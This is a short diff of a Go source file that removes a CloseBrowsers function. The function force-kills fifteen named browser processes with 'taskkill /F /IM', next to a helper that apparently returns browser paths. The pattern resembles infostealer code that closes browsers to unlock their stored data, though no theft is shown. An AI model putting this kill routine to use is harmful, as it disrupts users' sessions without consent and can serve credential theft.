@@ -46,15 +46,3 @@ func GetBPth() []string {
 func StringToByte(s string) []byte {
 	return []byte(s)
 }
-
-func CloseBrowsers() {
-	browserExe := []string{
-		"chrome.exe", "firefox.exe", "brave.exe", "opera.exe", "kometa.exe", "orbitum.exe",
-		"centbrowser.exe", "7star.exe", "sputnik.exe", "vivaldi.exe", "epicprivacybrowser.exe",
-		"msedge.exe", "uran.exe", "yandex.exe", "iridium.exe",
-	}
-
-	for _, exe := range browserExe {
-		exec.Command("taskkill", "/F", "/IM", exe, "/T").Run()
-	}
-}
